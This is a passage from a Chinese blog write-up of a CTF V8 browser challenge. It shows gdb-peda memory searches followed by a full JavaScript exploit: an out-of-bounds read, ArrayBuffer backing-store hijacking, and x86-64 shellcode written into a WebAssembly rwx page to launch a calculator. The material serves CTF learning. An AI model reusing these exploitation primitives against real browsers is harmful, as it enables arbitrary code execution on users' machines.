+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ vmmap</span><br><span class="line">Start              End                Perm      Name</span><br><span class="line">...</span><br><span class="line">0x00001f5814e80000 0x00001f5814ec0000 rw-p      mapped</span><br><span class="line">0x0000231280a80000 0x0000231280ac0000 rw-p      mapped</span><br><span class="line">0x00002784f3b00000 0x00002784f3b40000 rw-p      mapped</span><br><span class="line">0x00002883ffb08000 0x00002883ffb09000 rwxp      mapped &lt;==here</span><br><span class="line">0x00002883ffb09000 0x000028843fb08000 ---p      mapped</span><br><span class="line">0x00002ebcf3b80000 0x00002ebcf3b96000 rw-p      mapped</span><br><span class="line">0x0000300f7a8c0000 0x0000300f7a900000 rw-p      mapped</span><br><span class="line">0x000037c4f22c0000 0x000037c4f2300000 rw-p      mapped</span><br><span class="line">0x0000391c50f00000 0x0000391c50f01000 rw-p      mapped</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>尝试在f所在地址的一定范围内搜索rwx的部分地址<code>0x2883ffb0</code>，确实搜到了一处地方，经验证，该处存放的值就是rwx段的起始地址：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ find 0x2883ffb0 0x0000231280aa1000 0x0000231280aa3000</span><br><span class="line">Searching <span class="keyword">for</span> <span class="string">'0x2883ffb0'</span> <span class="keyword">in</span> range: 0x231280aa1000 - 0x231280aa3000</span><br><span class="line">Found 1 results, display max 1 items:</span><br><span class="line">mapped : 0x231280aa10da --&gt; 0xe1e900002883ffb0</span><br><span class="line">gdb-peda$ x/10xg 0x231280aa10d0</span><br><span class="line">0x231280aa10d0: 0x000055555635caa0      0x00002883ffb08000&lt;==here</span><br><span class="line">0x231280aa10e0: 0x00002784f3b0e1e9      0x00002784f3b0e459</span><br><span class="line">0x231280aa10f0: 0x0000231280a81851      0x0000231280aa1179</span><br><span class="line">0x231280aa1100: 0x000018b8c29804d1      0x000018b8c29804d1</span><br><span class="line">0x231280aa1110: 0x000018b8c29804d1      0x000018b8c29804d1</span><br><span class="line">gdb-peda$ vmmap 0x00002883ffb08000</span><br><span class="line">Start              End                Perm      Name</span><br><span class="line">0x00002883ffb08000 0x00002883ffb09000 rwxp      mapped</span><br></pre></td></tr></table></figure>
+<p>至此，整个利用思路就清楚了。首先利用数组越界读可获取到f对象的地址，然后把ArrayBuffer的backingstore修改为该地址附近的值，使用<code>dataview.getFloat64()</code>结合偏移可搜索出来rwx段的起始地址，然后将ArrayBuffer的backingstore修改为rwx的起始地址，写入shellcode即可。</p>
+<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20191120152118.png" alt=""></p>
+<p>完整的利用代码如下:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">"0"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	float64[<span class="number">0</span>] = f;</span><br><span class="line">	<span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">	<span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">2</span>, <span class="number">127</span>, <span class="number">127</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">21</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">95</span>, <span class="number">90</span>, <span class="number">51</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">105</span>, <span class="number">105</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">1</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">106</span>, <span class="number">11</span>]);</span><br><span class="line">	<span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> WebAssembly.Instance(<span class="keyword">new</span> WebAssembly.Module(wasm_code), &#123;&#125;);</span><br><span class="line">	<span class="keyword">let</span> f = wasm_mod.exports._Z3addii;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> length = &#123;</span><br><span class="line">		valueOf:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">20000000000000</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;   </span><br><span class="line">	<span class="keyword">var</span> val= &#123;</span><br><span class="line">		valueOf:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			victim=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">12</span>).fill(<span class="number">1.1</span>)</span><br><span class="line">			array.length = <span class="number">0x100</span></span><br><span class="line">			<span class="keyword">return</span>  <span class="number">999999999999999</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">let</span> array=[];</span><br><span class="line">	array.length=<span class="number">34</span>;</span><br><span class="line">	array.coin(length,val);</span><br><span class="line">	<span class="keyword">var</span> vicobj=&#123;<span class="attr">marker</span>: <span class="number">1111222233334444</span>, <span class="attr">obj</span>: f&#125;</span><br><span class="line">	<span class="keyword">var</span> victimbuffer=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x222</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(victimbuffer);</span><br><span class="line">	<span class="keyword">var</span> offset_to_vicobj = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">var</span> offset_to_victimbuffer = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">400</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">let</span> val = f2i(victim[i]);</span><br><span class="line">		<span class="keyword">if</span> (val === <span class="number">0x430f9534b3e01560</span>n) &#123;</span><br><span class="line">			offset_to_vicobj = i +<span class="number">1</span>;</span><br><span class="line">			<span class="built_in">console</span>.log(<span class="string">"[+] VictimObj.obj's offset of OOBARR = "</span>,offset_to_vicobj.toString());</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">400</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">let</span> val = f2i(victim[i]);</span><br><span class="line">		<span class="keyword">if</span> (val === <span class="number">0x222</span>n) &#123;</span><br><span class="line">			offset_to_victimbuffer = i + <span class="number">1</span>;</span><br><span class="line">			<span class="built_in">console</span>.log(<span class="string">"[+] VictimBuf's backing store pointer's offset of OOBARR = "</span>,offset_to_victimbuffer.toString());</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> wasm_addr = f2i(victim[offset_to_vicobj])<span class="number">-0x189</span>n;</span><br><span class="line">	<span class="keyword">var</span> tmp;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">'wasm code: '</span>,hex(wasm_addr));</span><br><span class="line">	victim[offset_to_victimbuffer] = i2f(wasm_addr);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;++i)&#123;</span><br><span class="line">		tmp = f2i(dataview.getFloat64(i*<span class="number">8</span>,<span class="literal">true</span>));</span><br><span class="line">		<span class="keyword">if</span>(tmp%<span class="number">0x1000</span>n==<span class="number">0</span>n&amp;&amp;tmp/<span class="number">0x1000</span>n&gt;<span class="number">0x1000</span>n&amp;&amp;((tmp&amp;<span class="number">0x0000ff0000000000</span>n)!=<span class="number">0x7f</span>n)&amp;&amp;(tmp&amp;<span class="number">0xff0000</span>n))&#123;</span><br><span class="line">			wasm_addr = tmp;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">'rwx addr: '</span>,hex(wasm_addr));</span><br><span class="line">	<span class="keyword">let</span> shellcode = [</span><br><span class="line">		<span class="number">72</span>, <span class="number">184</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">46</span>, <span class="number">121</span>, <span class="number">98</span>,</span><br><span class="line">		<span class="number">96</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">47</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">98</span>,</span><br><span class="line">		<span class="number">105</span>, <span class="number">110</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">231</span>, <span class="number">104</span>, <span class="number">59</span>, <span class="number">49</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">129</span>, <span class="number">52</span>, <span class="number">36</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">		<span class="number">72</span>, <span class="number">184</span>, <span class="number">68</span>, <span class="number">73</span>, <span class="number">83</span>, <span class="number">80</span>, <span class="number">76</span>, <span class="number">65</span>, <span class="number">89</span>, <span class="number">61</span>, <span class="number">80</span>, <span class="number">49</span>, <span class="number">210</span>, <span class="number">82</span>, <span class="number">106</span>, <span class="number">8</span>, <span class="number">90</span>,</span><br><span class="line">		<span class="number">72</span>, <span class="number">1</span>, <span class="number">226</span>, <span class="number">82</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">226</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">80</span>, <span class="number">72</span>,</span><br><span class="line">		<span class="number">184</span>, <span class="number">121</span>, <span class="number">98</span>, <span class="number">96</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">246</span>, <span class="number">86</span>, <span class="number">106</span>, <span class="number">8</span>,</span><br><span class="line">		<span class="number">94</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">230</span>, <span class="number">86</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">230</span>, <span class="number">106</span>, <span class="number">59</span>, <span class="number">88</span>, <span class="number">15</span>, <span class="number">5</span></span><br><span class="line">	];</span><br><span class="line"></span><br><span class="line">	victim[offset_to_victimbuffer] = i2f(wasm_addr);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;shellcode.length;++i)&#123;</span><br><span class="line">		dataview.setUint8(i,shellcode[i]);</span><br><span class="line">		<span class="comment">// dataview.setFloat64(i*8,i2f(shellcode[i]));</span></span><br><span class="line">	&#125;</span><br><span class="line">	f();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exploit();</span><br></pre></td></tr></table></figure></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/6577" target="_blank" rel="noopener">https://xz.aliyun.com/t/6577</a></p>
+<p><a href="http://www.dayjun.top/2019/10/24/%E4%BB%8E0-01%E5%AD%A6%E8%B5%B7%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E7%BA%BF%E4%B8%8B%E8%B5%9BChrome/" target="_blank" rel="noopener">http://www.dayjun.top/2019/10/24/%E4%BB%8E0-01%E5%AD%A6%E8%B5%B7%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E7%BA%BF%E4%B8%8B%E8%B5%9BChrome/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/browser/" rel="tag"># browser</a>
+          
+            <a href="/tags/v8/" rel="tag"># v8</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/26/0ctf-2019/embedded_heap/" rel="next" title="0ctf2019 Final embedded_heap题解">
+                <i class="fa fa-chevron-left"></i> 0ctf2019 Final embedded_heap题解
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">e3pem</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/e3pem" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i></a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:ymyushouxi@163.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i></a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://p4nda.top/" title="P4nda" target="_blank">P4nda</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://sunichi.github.io/" title="Sunichi" target="_blank">Sunichi</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ble55ing.github.io/" title="Ble55ing" target="_blank">Ble55ing</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://p1umer.github.io/" title="P1umer" target="_blank">P1umer</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ama2in9.top/" title="Ama2in9" target="_blank">Ama2in9</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xiaoxiaorenwu.top/" title="xiaoxiaorenwu" target="_blank">xiaoxiaorenwu</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#数字经济线下-Browser"><span class="nav-number">1.</span> <span class="nav-text">数字经济线下-Browser</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目分析"><span class="nav-number">3.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Object-ToNumber的分析"><span class="nav-number">4.</span> <span class="nav-text">Object::ToNumber的分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用-1"><span class="nav-number">5.</span> <span class="nav-text">漏洞利用-1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用-2"><span class="nav-number">6.</span> <span class="nav-text">漏洞利用-2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">7.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">e3pem</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
